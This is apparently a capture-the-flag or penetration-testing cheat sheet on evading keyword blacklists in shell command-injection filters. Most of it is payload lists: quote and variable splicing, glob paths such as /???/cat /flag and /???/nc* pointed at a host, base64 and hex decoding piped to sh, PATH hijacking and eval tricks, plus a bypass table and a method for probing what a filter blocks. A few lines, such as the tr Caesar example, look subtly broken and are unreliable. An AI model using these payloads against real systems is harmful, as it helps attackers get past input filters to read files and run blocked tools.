# Keyword Filters — when the command name itself is blocked

## The pattern — `cat`, `flag`, `nc`, `curl`, `sh` on a blacklist

A regex or `stripos`/`contains` list blocks names. Shell doesn't match
names literally — it tokenizes and expands — so anything that produces
the name at exec time bypasses a static blacklist.

## Quoting — `c'a't` `c"a"t` `ca\t`

```
c'a't /flag      → cat /flag    (quotes removed at token join)
c"a"t /flag
c\at /flag       → backslash inside word = literal escape — eaten
ca''t /flag      → empty-quote pair inside a word
c$@at            — $@ expands to nothing
c$*at            — same
c\u0074          — NOT shell — that's not a shell escape
ca$EMPTYt        — empty var splices the name
```

`$@`, `$*`, `$0`-substring, `${x:-y}` defaults all splice into names.

## Concatenation — build the name from parts

```
c${x}at         where x=''
a=c;b=at;$a$b    → $a$b expands to "cat" at exec
CA=T;${CA}T      — case-assign trick
$(echo c)at
`echo c`at
```

Var-splicing is the strongest general bypass — `$x` expands inside a
word.

## Glob the name — `?`/`*`/`[]` replace blocked strings

```
/???/cat /flag        → /bin/cat /flag
/???/c?t /flag
/???/[a-z]at /flag
/???/nc* YOU 80
/???/ba?e64
```

`?` matches one char, `*` any run, `[abc]` a set. The blacklist matches
literal `cat`; the glob resolves at exec to `/bin/cat`.
`wildcard-globbing.md` for the full pattern catalogue.

## Whitespace inside the name — `$IFS` splits at exec

`c$IFS at` — no: `$IFS` splits WORDS, not chars inside a word — `c$IFS at`
is two words. The right tricks: `c$@at`, ``c`echo a`t``, `c${u}at`.

## Case transforms — `${var^^}`/`${var,,}` (bash)

```
X=CAT;${X,,} /flag     — lowercase-transform a var
${0,,}                 — case-fold $0
```

Bash 4+ only — dash/sh lack `,,`/`^^`.

## Encode-then-decode — printf/echo decoding

```
$(echo Y2F0|base64 -d) /flag        — base64
$(printf '\x63\x61\x74') /flag      — hex escapes → "cat"
$(printf '\143\141\164') /flag      — octal
$(echo 636174|xxd -r -p) /flag      — xxd hex
echo -e '\143\141\164' |sh          — pipe to sh
```

`encoding.md` for the full decoding toolkit. The blacklist sees
`printf`/`echo`/`base64` — common names that are rarely blocked (and if
they are, glob them too: `/???/??intf`).

## `tr`/`rev`/`sed` transforms

```
$(echo tac|rev) /flag
$(echo 'dbu'|tr 'a-z' 'za-za1')/flag — caesar-shifted
```

## Wildcards in PATH — command resolution via PATH

`PATH` order decides which `cat` — write your own `/tmp/x/cat` script,
`PATH=/tmp/x:$PATH cat /flag` — env-var-injection.md.

## The blacklist's own list — enumerate what's blocked

Send each candidate name alone in the arg and note which 403 vs pass —
a stripped-name list tells you the filter's coverage and sometimes its
intent (the blocked set points at the sink: blocking `cat|nc|curl` means
a shell exists).

## `eval`/indirection — the evaluator bypass

```
eval "c""at" /flag          — eval re-parses
x=cat;$x /flag              — var deref
sh -c 'cat /flag'           — nested shell parses fresh
bash<<<"cat /flag"          — herestring
```

`eval` itself may be filtered — glob it: `e$@val`, `e''val`.

## The lexer-bypass catalogue — tokenization differences

| Filter checks | Shell actually runs |
|---|---|
| `cat` substring | `c'a't`, `c$@at`, `/???/cat`, `$(printf '\x63\x61\x74')` |
| `flag` substring | `fl$@ag`, `fl*`, `f[a]ag`, `${f}lag` after `f=` |
| `/` | `${PWD:0:1}`, glob `/???`, `cd` chains |
| `;` | newline `%0a`, `|`, `&&`, `&&` |
| ` ` | `$IFS`, `{a,b}`, `<%09` |
| `nc` | `ncat`/`netcat`/`socat` — same function different name |

## When the filter is a real tokenizer — rare but real

A filter that parses shell grammar (not substring) catches `c'a't` —
then the answer is `argument-injection.md` (no new command, abuse the
fixed command's flags) or a different class entirely.

## Falsifiers

- the filter is a true lexer AND argv position can't hold flags AND no
  decoding happens server-side

## Output to record

- the blocked-name list observed + which evasion form passed
